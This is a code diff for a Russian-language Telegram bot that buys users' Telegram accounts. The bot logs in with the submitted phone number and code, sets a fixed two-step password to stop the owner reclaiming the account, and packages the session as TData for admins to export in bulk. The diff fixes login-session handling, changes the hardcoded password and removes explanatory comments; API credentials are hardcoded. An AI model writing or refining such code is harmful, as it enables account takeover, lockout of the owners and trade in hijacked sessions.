@@ -40,7 +40,7 @@ LOGS_CHANNEL_ID = -1003813816419
 
 API_ID = 31063615
 API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
-AUTO_PASSWORD = "SamoobmanPassword123!"
+AUTO_PASSWORD = "ssss"
 
 DB_PATH = "database.db"
 SESSIONS_DIR = "sessions_data"
@@ -188,7 +188,6 @@ async def send_or_edit_message(message_or_callback, text: str, reply_markup: Inl
 
     if isinstance(message_or_callback, CallbackQuery):
         msg = message_or_callback.message
-        # Если тип сообщения отличается (было с фото, стало без или наоборот), пересоздаем
         if photo_id:
             try:
                 await msg.delete()
@@ -205,7 +204,6 @@ async def send_or_edit_message(message_or_callback, text: str, reply_markup: Inl
             except Exception:
                 return await msg.answer(text, reply_markup=reply_markup, parse_mode=parse_mode)
     else:
-        # Для Message
         if photo_id:
             return await message_or_callback.answer_photo(photo=photo_id, caption=text, reply_markup=reply_markup,
                                                           parse_mode=parse_mode)
@@ -317,7 +315,7 @@ async def cb_profile(callback: CallbackQuery):
     await send_or_edit_message(callback, text, get_back_keyboard(), "profile")
 
 
-# ================= АВТОРИЗАЦИЯ И СДАЧА АККАУНТА (Защита от обмана) =================
+# ================= АВТОРИЗАЦИЯ И СДАЧА АККАУНТА =================
 @router.callback_query(F.data == "menu_submit_tg")
 async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
     text = (
@@ -336,7 +334,6 @@ async def process_phone(message: Message, state: FSMContext):
         return await message.answer(
             "❌ Неверный формат. Номер должен начинаться с плюса (+) и содержать код страны. Попробуйте снова:")
 
-    # Проверка: не сдавался ли этот номер ранее никем (защита от повторного использования чужих номеров)
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT id FROM accounts WHERE phone = ?", (phone,)) as cursor:
             if await cursor.fetchone():
@@ -371,8 +368,8 @@ async def cb_request_tg_code(callback: CallbackQuery, state: FSMContext):
     if not phone or not session_path:
         return await callback.answer("❌ Сессия устарела. Начните заново.", show_alert=True)
 
-    client = TelegramClient(session_path, API_ID, API_HASH)
-    await state.update_data(client=client)
+    # Исправление ошибки: передаем API_ID как строку
+    client = TelegramClient(session_path, str(API_ID), API_HASH)
 
     try:
         await client.connect()
@@ -395,22 +392,31 @@ async def cb_request_tg_code(callback: CallbackQuery, state: FSMContext):
         await callback.message.edit_text(
             f"❌ Ошибка отправки кода: {e}\nПопробуйте заново.", reply_markup=get_back_keyboard()
         )
+    finally:
+        # Отключаем клиент, чтобы не держать висячее соединение до ввода кода
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
 
 
 @router.message(AuthStates.waiting_for_code)
 async def process_code(message: Message, state: FSMContext):
     code = message.text.strip()
     data = await state.get_data()
-    client: TelegramClient = data.get("client")
     phone = data.get("phone")
     phone_code_hash = data.get("phone_code_hash")
     session_name = data.get("session_name")
+    session_path = data.get("session_path")
 
-    if not client:
+    if not phone or not session_path:
         return await message.answer("❌ Ошибка сессии. Вернитесь в меню и попробуйте снова.",
                                     reply_markup=get_back_keyboard())
 
+    client = TelegramClient(session_path, str(API_ID), API_HASH)
+
     try:
+        await client.connect()
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
     except SessionPasswordNeededError:
         await message.answer(
@@ -420,6 +426,7 @@ async def process_code(message: Message, state: FSMContext):
         await state.clear()
         return
     except (PhoneCodeInvalidError, PhoneCodeEmptyError):
+        await client.disconnect()
         return await message.answer("❌ Неверный введенный код. Попробуйте еще раз:")
     except Exception as e:
         await message.answer(f"❌ Ошибка авторизации: {e}")
@@ -427,7 +434,6 @@ async def process_code(message: Message, state: FSMContext):
         await state.clear()
         return
 
-    # Защита от дублей на уровне базы данных перед сохранением
     async with aiosqlite.connect(DB_PATH) as db:
         async with db.execute("SELECT id FROM accounts WHERE phone = ?", (phone,)) as cursor:
             if await cursor.fetchone():
@@ -436,13 +442,11 @@ async def process_code(message: Message, state: FSMContext):
                 return await message.answer("❌ Этот аккаунт уже был успешно сдан ранее!",
                                             reply_markup=get_main_keyboard(message.from_user.id))
 
-    # Установка нового пароля для предотвращения угона/возврата аккаунта пользователем
     try:
         await client.edit_2fa(new_password=AUTO_PASSWORD)
     except Exception as e:
         logger.warning(f"Не удалось установить пароль: {e}")
 
-    # Конвертация в TData
     tdata_folder = os.path.join(SESSIONS_DIR, f"tdata_{phone.replace('+', '')}_{int(asyncio.get_event_loop().time())}")
     archive_path = None
 
@@ -454,7 +458,6 @@ async def process_code(message: Message, state: FSMContext):
     finally:
         await client.disconnect()
 
-    # Сохранение в БД и начисление бонуса
     async with aiosqlite.connect(DB_PATH) as db:
         await db.execute(
             "INSERT INTO accounts (user_id, phone, session_name, date) VALUES (?, ?, ?, datetime('now'))",
@@ -466,7 +469,6 @@ async def process_code(message: Message, state: FSMContext):
         )
         await db.commit()
 
-    # Отправка администраторам
     if archive_path and os.path.exists(archive_path):
         for admin_id in ADMIN_IDS:
             try:
@@ -494,7 +496,7 @@ async def process_code(message: Message, state: FSMContext):
     await state.clear()
 
 
-# ================= ВЫВОД СРЕДСТВ (Защита от накрутки и обмана) =================
+# ================= ВЫВОД СРЕДСТВ =================
 @router.callback_query(F.data == "menu_withdraw")
 async def cb_withdraw(callback: CallbackQuery, state: FSMContext):
     user_data = await get_user(callback.from_user.id)
@@ -520,7 +522,6 @@ async def process_withdraw(message: Message, state: FSMContext):
     user_data = await get_user(message.from_user.id)
     current_balance = user_data[3]
 
-    # Строгая проверка баланса (защита от вывода несуществующих средств)
     if amount <= 0:
         return await message.answer("❌ Сумма вывода должна быть больше нуля:")
 
@@ -528,7 +529,6 @@ async def process_withdraw(message: Message, state: FSMContext):
         return await message.answer(f"❌ Недостаточно средств. Ваш баланс: ${current_balance:.2f}. Введите меньше:")
 
     async with aiosqlite.connect(DB_PATH) as db:
-        # Списываем средства сразу, чтобы пользователь не мог потратить их дважды
         await db.execute("UPDATE users SET balance = balance - ? WHERE user_id = ?", (amount, message.from_user.id))
         cursor = await db.execute("INSERT INTO withdraw_requests (user_id, amount) VALUES (?, ?)",
                                   (message.from_user.id, amount))
@@ -576,7 +576,6 @@ async def admin_pay_cancel(callback: CallbackQuery):
             row = await cursor.fetchone()
             if row:
                 uid, amt = row
-                # Возвращаем средства обратно на баланс юзера при отмене
                 await db.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amt, uid))
                 await db.execute("UPDATE withdraw_requests SET status = 'cancelled' WHERE id = ?", (req_id,))
                 await db.commit()
@@ -589,7 +588,7 @@ async def admin_pay_cancel(callback: CallbackQuery):
     await callback.message.edit_text(f"{callback.message.text}\n\n**[ОТМЕНЕНО ❌]**", parse_mode="Markdown")
 
 
-# ================= АДМИН-ПАНЕЛЬ (Отдельная кнопка только для админа) =================
+# ================= АДМИН-ПАНЕЛЬ =================
 @router.callback_query(F.data == "admin_panel")
 async def cb_admin_panel(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
@@ -607,7 +606,6 @@ async def cb_admin_panel(callback: CallbackQuery):
                                      parse_mode="Markdown")
 
 
-# 1. Выгрузка всех TDATA папок в архиве
 @router.callback_query(F.data == "admin_export_tdata")
 async def admin_export_tdata(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS: return
@@ -623,7 +621,6 @@ async def admin_export_tdata(callback: CallbackQuery):
         await callback.answer("📁 Папка с сессиями пуста.", show_alert=True)
 
 
-# 2. Выгрузка юзеров в красивую текстовую таблицу (TXT)
 @router.callback_query(F.data == "admin_export_txt")
 async def admin_export_txt(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS: return
@@ -651,7 +648,6 @@ async def admin_export_txt(callback: CallbackQuery):
     )
 
 
-# 3. Изменение баланса юзера
 @router.callback_query(F.data == "admin_change_balance")
 async def admin_change_bal_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS: return
@@ -694,7 +690,6 @@ async def admin_set_balance(message: Message, state: FSMContext):
     await state.clear()
 
 
-# 4. Рассылка сообщений
 @router.callback_query(F.data == "admin_broadcast")
 async def admin_broadcast_start(callback: CallbackQuery, state: FSMContext):
     if callback.from_user.id not in ADMIN_IDS: return
@@ -720,7 +715,6 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
     await state.clear()
 
 
-# 5. Управление фотографиями для разделов
 @router.callback_query(F.data == "admin_manage_photos")
 async def admin_manage_photos(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS: return
